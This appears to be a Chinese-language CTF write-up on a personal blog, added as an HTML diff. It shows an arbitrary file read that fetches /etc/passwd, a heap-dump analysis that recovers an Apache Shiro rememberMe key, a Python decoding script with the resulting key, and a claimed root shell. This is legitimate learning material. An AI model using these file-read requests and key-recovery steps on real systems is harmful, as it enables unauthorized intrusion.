@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="第一道题目：shiro找到正确的key在忙碌的过程中某佬丢给我一道ctf题目叫我耍耍 上来就一个公网ip，case1如下： target: http:&#x2F;&#x2F;某公网ip&#x2F;case1&#x2F; 抓包发现file参数加载css找到目录路径  fuzz后常识发现file参数任意文件读取一枚  Request： 12345678GET &#x2F;case1&#x2F;show&#x2F;showfile?">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF - 快乐getshell记录之有趣的shiro key">
+<meta property="og:url" content="https://bealee008.github.io/2023/03/09/CTF%20-%20%E5%BF%AB%E4%B9%90getshell%E8%AE%B0%E5%BD%95/index.html">
+<meta property="og:site_name" content="Bealee&#39;s Blog">
+<meta property="og:description" content="第一道题目：shiro找到正确的key在忙碌的过程中某佬丢给我一道ctf题目叫我耍耍 上来就一个公网ip，case1如下： target: http:&#x2F;&#x2F;某公网ip&#x2F;case1&#x2F; 抓包发现file参数加载css找到目录路径  fuzz后常识发现file参数任意文件读取一枚  Request： 12345678GET &#x2F;case1&#x2F;show&#x2F;showfile?">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s2.loli.net/2023/03/09/twC5vVi7DNf682z.png">
+<meta property="og:image" content="https://s2.loli.net/2023/03/09/72vdpYqsLlxR8PA.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/26/v7fpU5u8sHOJ6ze.png">
+<meta property="og:image" content="https://s2.loli.net/2023/03/09/DnipmsUlPreQ76j.png">
+<meta property="og:image" content="https://s2.loli.net/2023/03/09/mvI8Wzn2LpkQ6xl.png">
+<meta property="og:image" content="https://s2.loli.net/2023/03/09/Ll2AQzr5DnStRX6.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/26/kIpgDStYbLT6PNf.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/26/I6nS7k28ahsFZeL.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/26/8P9jtIFrVacCLlJ.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/26/1FDT92ZOI4w3thE.png">
+<meta property="og:image" content="https://s2.loli.net/2023/03/09/1LngBOHeG82XPlQ.png">
+<meta property="og:image" content="https://s2.loli.net/2023/03/09/z8qpKRXwWhU93JB.png">
+<meta property="article:published_time" content="2023-03-09T05:24:54.576Z">
+<meta property="article:modified_time" content="2023-03-09T05:24:31.424Z">
+<meta property="article:author" content="Bealee">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2023/03/09/twC5vVi7DNf682z.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>CTF - 快乐getshell记录之有趣的shiro key</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="Bealee&#39;s Blog" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/note/">Note</a></li><!--
+     --><!--
+       --><li><a href="/tag/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/project/">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/03/08/%E8%8B%B1%E8%AF%AD%E8%80%83%E7%A0%94%E5%8D%95%E8%AF%8D%E8%81%94%E6%83%B3%E8%AE%B0%E5%BF%86%E7%AC%94%E8%AE%B0-002/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://bealee008.github.io/2023/03/09/CTF%20-%20%E5%BF%AB%E4%B9%90getshell%E8%AE%B0%E5%BD%95/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://bealee008.github.io/2023/03/09/CTF%20-%20%E5%BF%AB%E4%B9%90getshell%E8%AE%B0%E5%BD%95/&text=CTF - 快乐getshell记录之有趣的shiro key"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://bealee008.github.io/2023/03/09/CTF%20-%20%E5%BF%AB%E4%B9%90getshell%E8%AE%B0%E5%BD%95/&title=CTF - 快乐getshell记录之有趣的shiro key"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bealee008.github.io/2023/03/09/CTF%20-%20%E5%BF%AB%E4%B9%90getshell%E8%AE%B0%E5%BD%95/&is_video=false&description=CTF - 快乐getshell记录之有趣的shiro key"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CTF - 快乐getshell记录之有趣的shiro key&body=Check out this article: https://bealee008.github.io/2023/03/09/CTF%20-%20%E5%BF%AB%E4%B9%90getshell%E8%AE%B0%E5%BD%95/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://bealee008.github.io/2023/03/09/CTF%20-%20%E5%BF%AB%E4%B9%90getshell%E8%AE%B0%E5%BD%95/&title=CTF - 快乐getshell记录之有趣的shiro key"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://bealee008.github.io/2023/03/09/CTF%20-%20%E5%BF%AB%E4%B9%90getshell%E8%AE%B0%E5%BD%95/&title=CTF - 快乐getshell记录之有趣的shiro key"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://bealee008.github.io/2023/03/09/CTF%20-%20%E5%BF%AB%E4%B9%90getshell%E8%AE%B0%E5%BD%95/&title=CTF - 快乐getshell记录之有趣的shiro key"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://bealee008.github.io/2023/03/09/CTF%20-%20%E5%BF%AB%E4%B9%90getshell%E8%AE%B0%E5%BD%95/&title=CTF - 快乐getshell记录之有趣的shiro key"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://bealee008.github.io/2023/03/09/CTF%20-%20%E5%BF%AB%E4%B9%90getshell%E8%AE%B0%E5%BD%95/&name=CTF - 快乐getshell记录之有趣的shiro key&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://bealee008.github.io/2023/03/09/CTF%20-%20%E5%BF%AB%E4%B9%90getshell%E8%AE%B0%E5%BD%95/&t=CTF - 快乐getshell记录之有趣的shiro key"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%EF%BC%9Ashiro%E6%89%BE%E5%88%B0%E6%AD%A3%E7%A1%AE%E7%9A%84key"><span class="toc-number">1.</span> <span class="toc-text">第一道题目：shiro找到正确的key</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        CTF - 快乐getshell记录之有趣的shiro key
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Bealee</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-03-09T05:24:54.576Z" itemprop="datePublished">2023-03-09</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="第一道题目：shiro找到正确的key"><a href="#第一道题目：shiro找到正确的key" class="headerlink" title="第一道题目：shiro找到正确的key"></a>第一道题目：shiro找到正确的key</h2><p>在忙碌的过程中某佬丢给我一道ctf题目叫我耍耍</p>
+<p>上来就一个公网ip，case1如下：</p>
+<p>target:</p>
+<p>http:&#x2F;&#x2F;某公网ip&#x2F;case1&#x2F;</p>
+<p>抓包发现file参数加载css找到目录路径</p>
+<p><img src="https://s2.loli.net/2023/03/09/twC5vVi7DNf682z.png" alt="image-20230309125248921.png"></p>
+<p>fuzz后常识发现file参数任意文件读取一枚</p>
+<p><img src="https://s2.loli.net/2023/03/09/72vdpYqsLlxR8PA.png" alt="image-20230309125340472.png"></p>
+<p>Request：</p>
+<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /case1/<span class="keyword">show</span>/showfile?file=%<span class="number">2</span>fetc%<span class="number">2</span>fpasswd HTTP/<span class="number">1.1</span></span><br><span class="line">Host: ip</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">97.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">97.0</span></span><br><span class="line">Accept: text/css,*<span class="comment">/*;q=0.1</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Referer: http://175.27.156.185/case1/</span></span><br></pre></td></tr></table></figure>
+
+<p>Response：</p>
+<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> </span><br><span class="line">Server: nginx/<span class="number">1.14</span><span class="number">.1</span></span><br><span class="line">Date: Fri, <span class="number">25</span> Feb <span class="number">2022</span> <span class="number">10</span>:<span class="number">55</span>:<span class="number">07</span> GMT</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: <span class="number">919</span></span><br><span class="line"></span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/bin/bash</span><br><span class="line">daemon:x:<span class="number">1</span>:<span class="number">1</span>:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:<span class="number">2</span>:<span class="number">2</span>:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:<span class="number">3</span>:<span class="number">3</span>:sys:/dev:/usr/sbin/nologin</span><br><span class="line"><span class="keyword">sync</span>:x:<span class="number">4</span>:<span class="number">65534</span>:<span class="keyword">sync</span>:/bin:/bin/<span class="keyword">sync</span></span><br><span class="line">games:x:<span class="number">5</span>:<span class="number">60</span>:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:<span class="number">6</span>:<span class="number">12</span>:man:/<span class="keyword">var</span>/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:<span class="number">7</span>:<span class="number">7</span>:lp:/<span class="keyword">var</span>/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:<span class="number">8</span>:<span class="number">8</span>:mail:/<span class="keyword">var</span>/mail:/usr/sbin/nologin</span><br><span class="line">news:x:<span class="number">9</span>:<span class="number">9</span>:news:/<span class="keyword">var</span>/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:<span class="number">10</span>:<span class="number">10</span>:uucp:/<span class="keyword">var</span>/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:<span class="number">13</span>:<span class="number">13</span>:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:<span class="number">33</span>:<span class="number">33</span>:www-data:/<span class="keyword">var</span>/www:/usr/sbin/nologin</span><br><span class="line">backup:x:<span class="number">34</span>:<span class="number">34</span>:backup:/<span class="keyword">var</span>/backups:/usr/sbin/nologin</span><br><span class="line">list:x:<span class="number">38</span>:<span class="number">38</span>:Mailing <span class="built_in">List</span> Manager:/<span class="keyword">var</span>/list:/usr/sbin/nologin</span><br><span class="line">irc:x:<span class="number">39</span>:<span class="number">39</span>:ircd:/<span class="keyword">var</span>/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:<span class="number">41</span>:<span class="number">41</span>:Gnats Bug-Reporting System (admin):/<span class="keyword">var</span>/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:<span class="number">65534</span>:<span class="number">65534</span>:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:<span class="number">100</span>:<span class="number">65534</span>::/nonexistent:/bin/<span class="keyword">false</span></span><br></pre></td></tr></table></figure>
+
+<p>fuzz file参数后面的目录发现任意文件下载</p>
+<img src="https://s2.loli.net/2022/02/26/v7fpU5u8sHOJ6ze.png" >
+
+<p>扫描目录发现一个监控点，且是源码文件下载</p>
+<p><img src="https://s2.loli.net/2023/03/09/DnipmsUlPreQ76j.png" alt="image-20230309125631006.png"></p>
+<p>把dump源码下来</p>
+<p><img src="https://s2.loli.net/2023/03/09/mvI8Wzn2LpkQ6xl.png" alt="image-20230309125708678.png"></p>
+<p>全局找key，和审计base64Decode思路失败后尝试利用file参数headdump缓存内存文件分析</p>
+<p><img src="https://s2.loli.net/2023/03/09/Ll2AQzr5DnStRX6.png" alt="image-20230309125806976.png"></p>
+<p>这里使用的工具是VisualVM2.1.2 ，为了如何使用该工具，我花了十分钟左右在Google学会了该工具的基本用法</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://visualvm.github.io/download.html</span><br></pre></td></tr></table></figure>
+
+<p>导入headdump文件分析</p>
+<img src="https://s2.loli.net/2022/02/26/kIpgDStYbLT6PNf.png" >
+
+<img src="https://s2.loli.net/2022/02/26/I6nS7k28ahsFZeL.png" >
+
+<p>全局找这个CookieRememberMeManager这个对象</p>
+<img src="https://s2.loli.net/2022/02/26/8P9jtIFrVacCLlJ.png" >
+
+<img src="https://s2.loli.net/2022/02/26/1FDT92ZOI4w3thE.png" >
+
+<p>0-15这个标签就是内存里面的key值，但是说最原始状态，也就是key的ascii，需要用shiro的算法给它还原成key</p>
+<p>这里用python快速写了个shiro还原key算法脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(struct.pack(<span class="string">&#x27;&lt;bbbbbbbbbbbbbbbb&#x27;</span>,-<span class="number">59</span>,-<span class="number">125</span>,-<span class="number">56</span>,-<span class="number">36</span>,<span class="number">91</span>,-<span class="number">41</span>,<span class="number">106</span>,<span class="number">30</span>,-<span class="number">81</span>,-<span class="number">82</span>,-<span class="number">38</span>,<span class="number">99</span>,-<span class="number">61</span>,<span class="number">110</span>,<span class="number">122</span>,-<span class="number">86</span> )))</span><br></pre></td></tr></table></figure>
+
+<p>run一下</p>
+<p><img src="https://s2.loli.net/2023/03/09/1LngBOHeG82XPlQ.png" alt="image-20230309130141904.png"></p>
+<p>成功得到key</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xYPI3FvXah6vrtpjw256qg==</span><br></pre></td></tr></table></figure>
+
+<p>shiroEXP利用，getshell	root权限  快乐~  done 今天吃啥好呢？？</p>
+<p><img src="https://s2.loli.net/2023/03/09/z8qpKRXwWhU93JB.png" alt="image-20230309130525397.png"></p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/note/">Note</a></li>
+         
+          <li><a href="/tag/">Tag</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/project/">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%EF%BC%9Ashiro%E6%89%BE%E5%88%B0%E6%AD%A3%E7%A1%AE%E7%9A%84key"><span class="toc-number">1.</span> <span class="toc-text">第一道题目：shiro找到正确的key</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://bealee008.github.io/2023/03/09/CTF%20-%20%E5%BF%AB%E4%B9%90getshell%E8%AE%B0%E5%BD%95/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://bealee008.github.io/2023/03/09/CTF%20-%20%E5%BF%AB%E4%B9%90getshell%E8%AE%B0%E5%BD%95/&text=CTF - 快乐getshell记录之有趣的shiro key"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://bealee008.github.io/2023/03/09/CTF%20-%20%E5%BF%AB%E4%B9%90getshell%E8%AE%B0%E5%BD%95/&title=CTF - 快乐getshell记录之有趣的shiro key"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bealee008.github.io/2023/03/09/CTF%20-%20%E5%BF%AB%E4%B9%90getshell%E8%AE%B0%E5%BD%95/&is_video=false&description=CTF - 快乐getshell记录之有趣的shiro key"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CTF - 快乐getshell记录之有趣的shiro key&body=Check out this article: https://bealee008.github.io/2023/03/09/CTF%20-%20%E5%BF%AB%E4%B9%90getshell%E8%AE%B0%E5%BD%95/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://bealee008.github.io/2023/03/09/CTF%20-%20%E5%BF%AB%E4%B9%90getshell%E8%AE%B0%E5%BD%95/&title=CTF - 快乐getshell记录之有趣的shiro key"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://bealee008.github.io/2023/03/09/CTF%20-%20%E5%BF%AB%E4%B9%90getshell%E8%AE%B0%E5%BD%95/&title=CTF - 快乐getshell记录之有趣的shiro key"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://bealee008.github.io/2023/03/09/CTF%20-%20%E5%BF%AB%E4%B9%90getshell%E8%AE%B0%E5%BD%95/&title=CTF - 快乐getshell记录之有趣的shiro key"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://bealee008.github.io/2023/03/09/CTF%20-%20%E5%BF%AB%E4%B9%90getshell%E8%AE%B0%E5%BD%95/&title=CTF - 快乐getshell记录之有趣的shiro key"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://bealee008.github.io/2023/03/09/CTF%20-%20%E5%BF%AB%E4%B9%90getshell%E8%AE%B0%E5%BD%95/&name=CTF - 快乐getshell记录之有趣的shiro key&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://bealee008.github.io/2023/03/09/CTF%20-%20%E5%BF%AB%E4%B9%90getshell%E8%AE%B0%E5%BD%95/&t=CTF - 快乐getshell记录之有趣的shiro key"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    Bealee
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+      --><li><a href="/">Home</a></li><!--
+    --><!--
+      --><li><a href="/archives/">Writing</a></li><!--
+    --><!--
+      --><li><a href="/note/">Note</a></li><!--
+    --><!--
+      --><li><a href="/tag/">Tag</a></li><!--
+    --><!--
+      --><li><a href="/search/">Search</a></li><!--
+    --><!--
+      --><li><a href="/about/">About</a></li><!--
+    --><!--
+      --><li><a href="/project/">Projects</a></li><!--
+    -->
+      </ul>
+      <ul>
+        
+      </ul>
+    </nav>
+  </div>
+  
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'cactus-1';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
